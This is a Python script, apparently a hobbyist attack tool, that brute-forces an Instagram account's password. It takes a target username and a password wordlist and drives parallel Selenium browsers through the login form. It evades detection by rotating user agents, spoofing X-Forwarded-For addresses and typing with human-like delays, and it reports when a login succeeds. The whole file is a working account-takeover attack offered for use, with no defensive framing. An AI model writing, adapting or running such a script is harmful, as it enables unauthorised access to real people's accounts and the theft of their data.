from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from concurrent.futures import ThreadPoolExecutor
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from colorama import Fore, init
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import requests 
import random
import time 
init(autoreset=True)

PINK = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"

logo = f"""
                            ,--.    
                           K,   |
                          /  ~Y`
                     ,   /   /
                    |_'-K.__/
                      `/-.__L._
                      /  ' /`\_|
                     /  ' /
             ____   /  ' /
      ,-'~~~~    ~~/  ' /_
    ,'             ``~~~  ',
   (                        Y
  |                          |
 |      -                    `,
 |       ',                   )
 |        |   ,..__      __. Y
 |    .,_./  Y ' / ^Y   J   )|
 \           |' /   |   |   ||
  \          L_/    . _ (_,.'(
   \,   ,      ^^""' / |      )
     \_  \          /,L]     /
       '-_~-,       ` `   ./`
          `'|_            |
              ^^\..___,.--`   
"""
print(logo)

URL = "https://www.instagram.com/accounts/login"
USERNAME = input('[~] Enter the Username: ')
pass_file = input("[~] Enter passwords wordlist path: ")
ua_file = input("[~] Enter User-Agents wordlist path: ")
Ip_file = input('[+]enter the ip lists: ')

# قراءة ملف كلمات المرور
with open(pass_file, "r", encoding="utf-8") as f:
    passwords = [line.strip() for line in f if line.strip()]

## User-Agents rotation
with open(ua_file, "r", encoding="utf-8") as f:
    USER_AGENTS = [line.strip() for line in f if line.strip()]
## ip rotation
with open(Ip_file, "r", encoding="utf-8") as f:
    Ip_file = [line.strip() for line in f if line.strip()]
###
if not USER_AGENTS:
    print("[-] No User-Agents found. Exiting.")
    exit()
    
headers = {
    'User-Agent': random.choice(USER_AGENTS),
    'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
    'accept': "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
    'accept-language': "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
    'accept-encoding': "gzip, deflate, br, zstd",
    'referer': "https://www.instagram.com/",
    'origin': "https://www.instagram.com",
    'sec-ch-ua-platform': "Windows",
    'sec-fetch-site': "cross-site",
    'cache-control': "no-cache",
    "X-Forwarded-For": random.choice(Ip_file),
    'sec-fetch-dest': "image",
    'sec-ch-ua-mobile': "?0",
    'sec-fetch-mode': "cors",
    'priority': "u=1, i",
    'pragma': "no-cache"
}
response = requests.get(URL, headers=headers)

def type_human(element, text, min_delay=0.002, max_delay=0.004):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(min_delay, max_delay))

def browser_worker(pass_list):
    # اختيار User-Agent عشوائي لهذا المتصفح من القائمة المدخلة
    chrome_options = Options()
    chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
    chrome_options.add_argument('--lang=en-US')
    # chrome_options.add_argument('--headless')  # أضفها إذا أردت تسريع أكثر
    
    driver = webdriver.Chrome(options=chrome_options)
    wait = WebDriverWait(driver, 10)  # وقت انتظار أقل
    
    try:
        for password in pass_list:
            driver.get(URL)
            
            username_field = wait.until(EC.element_to_be_clickable((By.NAME, "email")))
            password_field = wait.until(EC.element_to_be_clickable((By.NAME, "pass")))
            
            # تفريغ الحقول
            username_field.click()
            username_field.send_keys(Keys.CONTROL + "a")
            username_field.send_keys(Keys.DELETE)
            password_field.click()
            password_field.send_keys(Keys.CONTROL + "a")
            password_field.send_keys(Keys.DELETE)
            
            type_human(username_field, USERNAME)
            type_human(password_field, password)
            
            login_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[text()='Log in']/ancestor::div[@role='none']")))
            login_button.click()
            
            try:
                wait.until(EC.any_of(
                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(),'incorrect')]")),
                    EC.url_changes(URL)
                ))
                
                if driver.find_elements(By.XPATH, "//*[contains(text(),'incorrect')]"):                    
                    print(
                        f"[+] {Fore.BLACK}trying username:{Fore.BLUE}{USERNAME}"
                        f" | {Fore.BLACK}Pass:{Fore.RED}{password}"
                        f" | {Fore.BLACK}Session:{Fore.GREEN}{response.status_code} "
                        f"{Fore.WHITE}[login incorrect]"
                    )
                elif driver.current_url != URL:
                    print(
                        f"{Fore.BLACK}[+] trying username:{Fore.BLUE}{USERNAME}"
                        f" | {Fore.BLACK}Pass:{Fore.RED}{password}"
                        f" | {Fore.BLACK}Session:{Fore.GREEN}{response.status_code}"
                        f"{Fore.WHITE}login successful"
                    )
            except TimeoutException:
                print("Timeout - no expected state detected")
    finally:
        driver.quit()

# تقسيم قائمة كلمات المرور على عدد الـ workers (مثلاً 4)
numbrowaser = 2 # يمكنك تغيير الرقم حسب قدرة جهازك
chunks = [passwords[i::numbrowaser] for i in range(numbrowaser)]

with ThreadPoolExecutor(max_workers=numbrowaser) as executor:
    for chunk in chunks:
        executor.submit(browser_worker, chunk)
